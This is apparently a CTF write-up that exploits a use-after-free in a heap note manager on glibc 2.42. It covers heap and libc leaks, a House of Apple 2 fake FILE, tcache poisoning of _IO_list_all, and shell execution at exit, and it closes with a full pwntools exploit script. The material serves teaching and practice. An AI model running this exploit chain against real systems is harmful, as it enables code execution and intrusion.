# Challenge 67 — Heap UAF to Shell (glibc 2.42)

## Overview

This challenge gives us a standard heap note manager. We can create, delete, read, and edit notes. The binary has all protections enabled (Full RELRO, Canary, NX, PIE) and links against **glibc 2.42**, meaning there are no hook-based shortcuts like `__malloc_hook` or `__free_hook`.

The vulnerability is a classic **Use-After-Free**: the `delete_note` function calls `free()` on a note's heap chunk but never clears the pointer from the global `notes[]` array. This lets us read and write into freed memory.

---

## Binary Protections

First, let's check what we're dealing with:


<img width="667" height="152" alt="image" src="https://github.com/user-attachments/assets/c1b4ba0e-aec0-4bb4-a265-610c1b01162c" />


Everything is on. Full RELRO means we can't overwrite GOT entries. PIE means addresses are randomized. We need leaks and a creative code execution path.

---

## Reverse Engineering

We load the binary into Ghidra and decompile the key functions. The binary manages up to 10 notes (indices 0–9) stored in two global arrays:

```c
// Global arrays (from Ghidra)
undefined1[80] notes;   // 10 pointers (8 bytes each) → heap chunks
undefined1[40] sizes;   // 10 ints (4 bytes each) → chunk sizes
```

### create_note — Allocating a Note

```c
void create_note(void) {
    printf("Index: ");
    int idx = get_int();
    if ((idx < 0) || (9 < idx)) {
        puts("Invalid index");
    }
    else {
        printf("Size: ");
        int sz = get_int();
        if ((sz < 1) || (0x400 < sz)) {       // max size = 1024
            puts("Invalid size");
        }
        else {
            void *ptr = malloc((long)sz);
            *(void **)(notes + (long)idx * 8) = ptr;   // store pointer
            *(int *)(sizes + (long)idx * 4) = sz;       // store size
            printf("Data: ");
            read(0, *(void **)(notes + (long)idx * 8), (long)sz);
            puts("Note created!");
        }
    }
}
```

Nothing wrong here — standard allocation + read.

### delete_note — THE VULNERABLE FUNCTION 

```c
void delete_note(void) {
    printf("Index: ");
    int idx = get_int();
    if (((idx < 0) || (9 < idx)) || (*(long *)(notes + (long)idx * 8) == 0)) {
        puts("Invalid index");
    }
    else {
        free(*(void **)(notes + (long)idx * 8));    // ← frees the chunk
       
        puts("Note deleted!");
    }
}
```

**This is the bug.** After `free()`, the pointer stays in the `notes[]` array. A safe implementation would add `notes[idx] = NULL` after freeing, which would make `read_note` and `edit_note` reject the index. Without it, we have full Use-After-Free.

### read_note — UAF Read Primitive

```c
void read_note(void) {
    printf("Index: ");
    int idx = get_int();
    if (((idx < 0) || (9 < idx)) || (*(long *)(notes + (long)idx * 8) == 0)) {
        puts("Invalid index");
    }
    else {
        printf("Data: ");
        write(1, *(void **)(notes + (long)idx * 8),
              (long)*(int *)(sizes + (long)idx * 4));
        puts("");
    }
}
```

This checks if `notes[idx] != NULL` — but since `delete_note` never clears the pointer, this check passes even after freeing. We can **read the contents of freed chunks**, which contain heap metadata like forward pointers.

### edit_note — UAF Write Primitive

```c
void edit_note(void) {
    printf("Index: ");
    int idx = get_int();
    if (((idx < 0) || (9 < idx)) || (*(long *)(notes + (long)idx * 8) == 0)) {
        puts("Invalid index");
    }
    else {
        printf("New Data: ");
        read(0, *(void **)(notes + (long)idx * 8),
             (long)*(int *)(sizes + (long)idx * 4));
        puts("Note updated!");
    }
}
```

Same problem — we can **write into freed chunks**, corrupting heap metadata like Tcache forward pointers.

### main — The Menu Loop

```c
void main(void) {
    init();                    // disables buffering
    while (1) {
        menu();                // prints options 1-5
        int choice = get_int();
        if (choice == 1) create_note();
        else if (choice == 2) delete_note();
        else if (choice == 3) read_note();
        else if (choice == 4) edit_note();
        else if (choice == 5) exit(0);   // ← triggers FSOP cleanup
        else puts("Invalid option");
    }
}
```

Option 5 calls `exit(0)`, which we'll use to trigger our FSOP chain at the end.


## Exploitation Strategy

Our full attack chain is:

1. Leak the **heap base** using Tcache safe-linking
2. Leak the **libc base** using the Unsorted Bin
3. Build a **fake FILE structure** on the heap (House of Apple 2)
4. **Poison the Tcache** to overwrite `_IO_list_all`
5. **Trigger** `exit()` to flush file streams and get code execution



## Step 1 — Heap Leak

### Background: Tcache and Safe-Linking

When glibc frees a small chunk, it goes into the **Tcache** (a per-thread freelist). In glibc 2.42, the forward pointer (`fd`) stored in freed Tcache chunks is obfuscated using a technique called **safe-linking**:

```
stored_fd = real_next_chunk_addr ^ (this_chunk_addr >> 12)
```

The trick is: when a chunk is the **only** entry in its Tcache bin, `real_next_chunk_addr` is NULL (there's no next chunk). So:

```
stored_fd = 0 ^ (chunk_addr >> 12) = chunk_addr >> 12
```

We can read this value and shift it back to get the heap base.

### Exploit Code

```python
create(io, 0, 0x28, b'A' * 0x28)  # allocate a chunk
delete(io, 0)                       # free it → goes to Tcache
leak = read_note(io, 0, 0x28)       # UAF read → get the obfuscated fd
heap_key = u64(leak[:8])
heap_base = heap_key << 12           # recover the heap base
```

### Debugging with GDB

To see this yourself, run the exploit with GDB attached:

```bash
# In one terminal, start the binary under GDB
$ gdb -q ./chall
gdb> set environment LD_PRELOAD ./libc.so.6
gdb> run
```

After creating and freeing note 0, inspect the heap:

<img width="967" height="612" alt="image" src="https://github.com/user-attachments/assets/649e2b40-2f0a-4b3a-a8fa-bf044ce28542" />


The fact that option 3 works on a deleted note **is the bug**. You just read freed memory.

<img width="721" height="236" alt="image" src="https://github.com/user-attachments/assets/e779e6e0-efeb-477b-8e0c-c24700c5b093" />



The first 8 bytes of the freed chunk's user data is the obfuscated `fd`. Since it's the only chunk in this Tcache bin, it equals `chunk_addr >> 12`, which directly gives us the heap base when shifted back.

We now know where everything on the heap is located.

---

## Step 2 — Libc Leak

### Background: Unsorted Bin

Each Tcache bin can hold at most **7 chunks**. If we free an 8th chunk of the same size, it goes into the **Unsorted Bin** instead. Chunks in the Unsorted Bin have their `fd` and `bk` pointers set to addresses inside libc's `main_arena` structure.

### Exploit Code

```python
SZ = 0xf0  # request size (actual chunk size = 0x100)

# Allocate 9 chunks of the same size
for i in range(9):
    create(io, i, SZ, b'C' * SZ)

# Free 7 to fill the Tcache
for i in range(7):
    delete(io, i)

# The 8th free goes to the Unsorted Bin
# Chunk 8 stays allocated to prevent merging with the top chunk
delete(io, 7)

# UAF read the Unsorted Bin chunk → fd points into libc
unsorted_fd = u64(read_note(io, 7, SZ)[:8])
libc_base = unsorted_fd - 0x1e7c10  # offset specific to this libc build
```


### Debugging with GDB

After freeing all 8 chunks, inspect the bins:

<img width="1077" height="631" alt="image" src="https://github.com/user-attachments/assets/b077e5af-5fcd-4bad-a7b1-bfde8cf9fd03" />

You can also verify the offset:

```
gdb> p/x 0x7ffff7fb0c10 - $_base("libc.so.6")
$1 = 0x1e7c10
```

This confirms `UNSORTED_OFF = 0x1e7c10`. If your libc build is different, recalibrate using this method.

### Why chunk 8 matters

```
Memory layout:
  [chunk0..chunk6 in Tcache]  [chunk7 in Unsorted Bin]  [chunk8 ALLOCATED]  [top chunk]

If chunk 8 wasn't there:
  [chunk7 freed] ← would merge with top chunk → fd/bk pointers lost!
```

Chunk 8 is a "guard" that prevents chunk 7 from merging with the wilderness (top chunk).

With the libc base, we calculate the addresses we need:
```python
system          = libc_base + libc.sym['system']
_IO_list_all    = libc_base + libc.sym['_IO_list_all']
_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
```

After leaking, we reclaim the Tcache chunks so the slots are free for later:
```python
for i in range(7):
    create(io, i, SZ, b'D' * SZ)
```

---

## Step 3 — Fake FILE Structure (House of Apple 2)

### Background: Why FSOP?

Since glibc 2.42 removed the old `__malloc_hook` and `__free_hook`, we need a different way to hijack control flow. We use **FSOP (File Stream Oriented Programming)**, specifically the **House of Apple 2** technique.

### How FSOP Works

When `exit()` is called, glibc's cleanup routine walks through a linked list of FILE structures (`_IO_list_all`) and flushes each one. If we can make this list point to a fake FILE structure we control, we can redirect a virtual function call.

The call chain is:
```
exit(0)
  → _IO_flush_all_lockp()
    → for each FILE in _IO_list_all:
        if (_IO_write_ptr > _IO_write_base):
          → vtable->__overflow(fp)
```

By setting the vtable to `_IO_wfile_jumps`, we enter the wide-character code path:
```
_IO_wfile_overflow(fp)
  → _IO_wdoallocbuf(fp)         [because _wide_data->write_base == NULL]
    → _wide_vtable->__doallocate(fp)
```

We make `__doallocate` point to `system()`. The first argument (`fp`) is our fake FILE, and we set its `_flags` field to the string `"  sh\0"`. So the call becomes `system("  sh")`, which spawns a shell (leading spaces are ignored by the shell).

### Building the Payload

We allocate a 0x400-byte chunk, free it (UAF!), then write our fake structures into it:

```python
create(io, 9, 0x400, b'E' * 0x400)
delete(io, 9)  # freed, but we can still edit via UAF

# Read chunk9's safe-linked key to calculate its address
c9_key = u64(read_note(io, 9, 0x400)[:8])
chunk9 = (c9_key << 12) | CHUNK9_LOW12   # CHUNK9_LOW12 = 0xC40 for this layout
```

The payload has three parts laid out consecutively inside chunk9:

```
chunk9 (freed, 0x400 bytes):
┌─────────────────────────────────────┐ offset 0x000
│ Fake _IO_FILE (0xe0 bytes)          │
│   _flags        = "  sh\0"         │← becomes arg to system()
│   _IO_write_base = 0               │
│   _IO_write_ptr  = 1               │← triggers flush (ptr > base)
│   _lock          → chunk9 + 0x300  │← must point to writable zero
│   _wide_data     → chunk9 + 0xe0   │← points to our _IO_wide_data
│   _mode          = 1               │← enables wide-char path
│   vtable         = _IO_wfile_jumps  │← passes glibc vtable check
├─────────────────────────────────────┤ offset 0x0e0
│ Fake _IO_wide_data (0xe8 bytes)     │
│   _IO_write_base = 0               │← triggers _IO_wdoallocbuf
│   _IO_write_ptr  = 1               │← (ptr > base)
│   _wide_vtable   → chunk9 + 0x1c8  │← points to our fake vtable
├─────────────────────────────────────┤ offset 0x1c8
│ Fake _wide_vtable                   │
│   offset 0x68: __doallocate         │
│              = address of system()  │← THE MONEY SHOT
└─────────────────────────────────────┘
```

Then we use UAF edit to write it:
```python
edit(io, 9, payload)  # writes into freed chunk → data persists on heap
```

### Debugging with GDB

After writing the fake FILE, verify it looks correct:



---

## Step 4 — Tcache Poisoning

### Background

Now we need to overwrite `_IO_list_all` to point to our fake FILE. We do this by corrupting a Tcache chunk's forward pointer. When we poison the Tcache `fd`, the next allocation from that bin will return an arbitrary address — in our case, `_IO_list_all`.

### Exploit Code

```python
# Allocate and free two chunks to get a Tcache chain
create(io, 0, 0x38, b'F' * 0x38)
create(io, 1, 0x38, b'G' * 0x38)
delete(io, 0)  # Tcache[0x40]: [chunk0]
delete(io, 1)  # Tcache[0x40]: [chunk1] → [chunk0]

# Read the safe-linked key from chunk0 (UAF read)
shift = u64(read_note(io, 0, 0x38)[:8])

# Poison chunk1's fd to point to _IO_list_all (UAF write)
# We XOR with the key because of safe-linking
edit(io, 1, p64(_IO_list_all ^ shift))
```

After poisoning, the Tcache looks like:
```
Before: Tcache[0x40]: chunk1 → chunk0 → NULL
After:  Tcache[0x40]: chunk1 → _IO_list_all  (we replaced chunk1's fd)
```

Now we allocate twice:
```python
create(io, 1, 0x38, b'junk')       # Returns chunk1 (pops from Tcache)
create(io, 0, 0x38, p64(chunk9))   # Returns _IO_list_all! Write chunk9's address
```

### Debugging with GDB

Before and after the poison, inspect the Tcache:



---

## Step 5 — Getting Shell

### Trigger

We simply select option 5 (exit). This calls `exit(0)`, which triggers stream flushing:

```
exit(0)
  → _IO_flush_all_lockp()
    → finds our fake FILE via _IO_list_all
    → _IO_write_ptr (1) > _IO_write_base (0) → YES, needs flush
    → _mode > 0 → uses wide-char path
    → vtable->__overflow(fp) via _IO_wfile_jumps
      → _IO_wfile_overflow(fp)
        → _IO_wdoallocbuf(fp)          [wide write_base == NULL]
          → __doallocate(fp) = system(fp) = system("  sh")
            → SHELL! 🎉
```

```python
choose(io, 5)    # select "Exit"
io.interactive()  # enjoy your shell
```


## Exploit script:


````python
#!/usr/bin/env python3
# Usage: python3 exploit.py          (local)
#        python3 exploit.py DEBUG     (local + verbose)
#        python3 exploit.py REMOTE HOST=<ip> PORT=<port>
from pwn import *

exe  = ELF('./chall')
libc = ELF('./libc.so.6')
ld   = './ld-linux-x86-64.so.2'
context.binary = exe

def start():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    return process([ld, './chall'], env={"LD_PRELOAD": "./libc.so.6"})

def choose(io, n):
    io.sendafter(b'> ', f'{n}\n'.encode())

def create(io, idx, sz, data):
    choose(io, 1)
    io.sendafter(b'Index: ', f'{idx}\n'.encode())
    io.sendafter(b'Size: ',  f'{sz}\n'.encode())
    io.sendafter(b'Data: ',  data.ljust(sz, b'\x00')[:sz])

def delete(io, idx):
    choose(io, 2)
    io.sendafter(b'Index: ', f'{idx}\n'.encode())

def read_note(io, idx, sz):
    choose(io, 3)
    io.sendafter(b'Index: ', f'{idx}\n'.encode())
    io.recvuntil(b'Data: ')
    d = io.recv(sz); io.recvuntil(b'\n')
    return d

def edit(io, idx, data):
    choose(io, 4)
    io.sendafter(b'Index: ', f'{idx}\n'.encode())
    io.sendafter(b'New Data: ', data)

UNSORTED_OFF = 0x1e7c10
CHUNK9_LOW12 = 0xC40

io = start()

# 1. Heap leak — tcache safe-linking
create(io, 0, 0x28, b'A'*0x28)
delete(io, 0)
heap_key  = u64(read_note(io, 0, 0x28)[:8])
heap_base = heap_key << 12
log.success(f'heap = {hex(heap_base)}')
create(io, 0, 0x28, b'B'*0x28)

# 2. Libc leak — unsorted bin fd
SZ = 0xf0
for i in range(9): create(io, i, SZ, b'C'*SZ)
for i in range(7): delete(io, i)
delete(io, 7)

libc.address = u64(read_note(io, 7, SZ)[:8]) - UNSORTED_OFF
assert libc.address & 0xfff == 0
log.success(f'libc = {hex(libc.address)}')

system          = libc.sym['system']
_IO_list_all    = libc.sym['_IO_list_all']
_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']

for i in range(7): create(io, i, SZ, b'D'*SZ)

# 3. Fake FILE struct — House of Apple 2
create(io, 9, 0x400, b'E'*0x400)
delete(io, 9)
chunk9 = (u64(read_note(io, 9, 0x400)[:8]) << 12) | CHUNK9_LOW12

wide_data   = chunk9 + 0xe0
wide_vtable = chunk9 + 0x1c8
lock        = chunk9 + 0x300

fp  = p32(0x00687320) + p32(0)     # _flags = "  sh\0"
fp += p64(0)*3                      # read ptrs
fp += p64(0) + p64(1)              # write_base=0, write_ptr=1
fp += p64(0)*7                      # padding
fp += p64(0)                        # _chain
fp += p32(0) + p32(0)              # fileno, flags2
fp += p64(0)*2                      # old_offset etc
fp += p64(lock)                     # _lock
fp += p64(0)*2                      # offset, codecvt
fp += p64(wide_data)                # _wide_data
fp += p64(0)*3                      # pad3/4/5
fp += p32(1) + b'\x00'*20          # _mode=1
fp += p64(_IO_wfile_jumps)          # vtable

wd  = b'\x00'*0x18                  # wide read ptrs
wd += p64(0) + p64(1)              # wide write_base=0, write_ptr=1
wd += b'\x00'*(0xe0 - len(wd))     # padding
wd += p64(wide_vtable)              # _wide_vtable

wv  = b'\x00'*0x68
wv += p64(system)                   # __doallocate → system

edit(io, 9, (fp + wd + wv).ljust(0x400, b'\x00'))

# 4. Tcache poison → _IO_list_all
create(io, 0, 0x38, b'F'*0x38)
create(io, 1, 0x38, b'G'*0x38)
delete(io, 0)
delete(io, 1)

shift = u64(read_note(io, 0, 0x38)[:8])
edit(io, 1, p64(_IO_list_all ^ shift) + p64(0))

create(io, 1, 0x38, b'X'*0x38)
create(io, 0, 0x38, p64(chunk9))
log.success(f'_IO_list_all → {hex(chunk9)}')

# 5. Trigger
choose(io, 5)
io.interactive()
```
